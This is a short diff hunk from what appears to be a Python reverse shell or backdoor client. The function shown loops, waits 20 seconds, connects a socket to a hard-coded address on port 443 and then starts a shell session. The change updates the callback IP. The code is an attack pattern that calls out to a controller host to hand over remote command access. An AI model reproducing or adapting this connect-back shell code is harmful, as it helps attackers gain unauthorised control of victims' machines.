@@ -62,7 +62,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(("192.168.100.9", 443))
+            s.connect(("192.168.1.34", 443))
             shell()
             break  # Exit loop after successful shell session
         except socket.error as e:
